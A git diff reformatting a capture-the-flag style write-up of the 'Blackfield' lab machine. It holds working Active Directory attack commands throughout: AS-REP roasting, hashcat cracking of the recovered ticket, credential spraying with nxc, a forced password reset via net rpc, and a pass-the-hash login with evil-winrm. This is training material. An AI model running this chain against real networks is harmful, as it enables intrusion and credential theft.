@@ -20,11 +20,13 @@ I always start with network enumeration
 
 ## Network enumeration
 #### Rustscan
-`╰─ rustscan -a 10.10.10.192 --ulimit 5000 -g` 
+`╰─ rustscan -a 10.10.10.192 --ulimit 5000 -g` <br>
 10.10.10.192 -> [53,88,135,389,445,593,3268,5985]
 #### Nmap
-`╰─ nmap -sT -A -Pn -T5 -p 53,88,135,389,445,593,3268,5985 10.10.10.192 --disable-arp-ping --min  
--rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=3s`
+```
+╰─ nmap -sT -A -Pn -T5 -p 53,88,135,389,445,593,3268,5985 10.10.10.192 --disable-arp-ping --min  
+-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=3s
+```
 
 ![nmap](/assets/Chirpy/bf-nmap-scan.png)
 
@@ -52,25 +54,27 @@ But we don't find anything inside <br>
 ![spider](/assets/Chirpy/bf-spider1.png)<br>
 <br>So we attempt to bruteforce [RID](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid)
 <br>Let's redirect the output in a file (users.txt) and manipulate strings in order to retrieve a clear user list<br>
-`cat users.txt  | awk '{print $6}' | tr -d ":" >> toverify.txt & cat toverify.txt | sed -r 's\BLACKFIELD\ \g' | tr -d '\' | tr -d ' ' >> clean_users_toverify.txt`
+```
+cat users.txt  | awk '{print $6}' | tr -d ":" >> toverify.txt & cat toverify.txt | sed -r 's\BLACKFIELD\ \g' | tr -d '\' | tr -d ' ' >> clean_users_toverify.txt
+```
 
 ### Kerbrute
 Using `kerbrute userenum --dc dc01.blackfield.local -d blackfield.local clean_users_toverify.txt` we retrieve a list of users and computers inside the domain:
 
 ![kerbrute](/assets/Chirpy/bf-kerbrute.png)<br>
-`cat kerb_users.txt | awk '{print $7}' >> final_valid.txt`
+```cat kerb_users.txt | awk '{print $7}' >> final_valid.txt```
 
 ### AS-REP roasting
 We will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.<br>
 You can find the following tool here [impacket](https://github.com/fortra/impacket) inside impacket/examples/GetNPUsers.py<br>
 
-`GetNPUsers.py -no-pass -usersfile final_valid.txt blackfield.local/`
+```GetNPUsers.py -no-pass -usersfile final_valid.txt blackfield.local/```
 ![as-rep](/assets/Chirpy/as-rep.png)<br>
 Yes! We found one vulnerable user : `support`, let's save the ticket in a file and crack it.<br>
 According to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
 hash starting with ``$krb5asrep$`` has "18200" as module number
 ![krb](/assets/Chirpy/hashcat-mo.png)<br>
-`hashcat -a 0 -m 18200 support_ticket /usr/share/wordlists/rockyou.txt.utf`<br>
+```hashcat -a 0 -m 18200 support_ticket /usr/share/wordlists/rockyou.txt.utf```<br>
 ![hashcat](/assets/Chirpy/hashcat.png)<br>
 `support : #00^BlackKnight`
 
@@ -85,18 +89,18 @@ ldap
 psexec
 ```
 
-`for i in $(cat protocols );do nxc $i 10.10.10.192 -u 'support' -p '#00^BlackKnight';done`
+```for i in $(cat protocols );do nxc $i 10.10.10.192 -u 'support' -p '#00^BlackKnight';done```
 ![iterate](/assets/Chirpy/iterate.png)<br>
 Seems like we have access to RPC, but we already got all users, so we check if we have something:
-`rpcclient -U 'support%#00^BlackKnight' 10.10.10.192`
+```rpcclient -U 'support%#00^BlackKnight' 10.10.10.192```
 As expected, nothing was inside.
 
 Let's use smbmap to enumerate which shares we have access to : 
-`smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'`<br>
+```smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'```<br>
 <img width="1113" height="238" alt="Pasted image 20250911112555" src="https://github.com/user-attachments/assets/7c4c5d5e-837e-4a95-875d-9467c5dde5f9" /><br>
 
 Let's download everything using:
-`nxc smb blackfield.local -u 'support' -p '#00^BlackKnight' -M spider_plus -o DOWNLOAD_FLAG=True`<br>
+```nxc smb blackfield.local -u 'support' -p '#00^BlackKnight' -M spider_plus -o DOWNLOAD_FLAG=True```<br>
 We successfully got "SYSVOL", but after enumerated everything, nothing was found inside, we also had access to "profiles$"
 the content is something such as a nicknames list:<br>
 `smbclient \\\\10.10.10.192\\profiles$ -u 'support'`<br>
@@ -128,13 +132,13 @@ Perfect! we got `Outbound Object Control` :
 <img width="1211" height="288" alt="Pasted image 20250911120608" src="https://github.com/user-attachments/assets/6c89f50e-663c-4e37-b0a2-d0eec5c58a01" /><br>
 Permission to change password to AUDIT2020, in order to exploit this misconfiguration, we can use [net](https://www.kali.org/tools/net-tools/)
 
-`net rpc password "AUDIT2020" "newP@ssword2025" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"`
+```net rpc password "AUDIT2020" "newP@ssword2025" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"```
 
 We can now do the same process (Iterate over all the protocols) to see where we have access
 SMB ACCESS: `smbclient \\\\10.10.10.192\\forensic -U 'AUDIT2020'<br>
 <img width="786" height="212" alt="Pasted image 20250911121425" src="https://github.com/user-attachments/assets/fd1e4cba-f338-4e1a-99dc-d15baf1414aa" /><br>
 
-`nxc smb blackfield.local -u 'AUDIT2020' -p 'newP@ssword2025' -M spider_plus -o DOWNLOAD_FLAG=True`
+```nxc smb blackfield.local -u 'AUDIT2020' -p 'newP@ssword2025' -M spider_plus -o DOWNLOAD_FLAG=True```
 <img width="959" height="97" alt="Pasted image 20250911121046" src="https://github.com/user-attachments/assets/c0aa9bfb-e410-4580-bdf6-0505a7726e55" /><br>
 
 We notice an interesting file.<br>
@@ -146,7 +150,7 @@ Since it store credentials in memory, we can dump the credentials (or NT Hashes)
 <img width="1024" height="760" alt="Pasted image 20250911124036" src="https://github.com/user-attachments/assets/bb6ddb90-0998-4d3a-825a-122b5cb3c6aa" /><br>
 We successfully retrieved svc_backup NT HASH `9658d1d1dcd9250115e2205d9f48400d`
 ## Pass-The-Hash attack
-`evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'`
+```evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'```
 <img width="877" height="275" alt="Pasted image 20250911124222" src="https://github.com/user-attachments/assets/540e36b6-52db-47f1-8522-fd34fff16626" /><br>
 
 We got user!
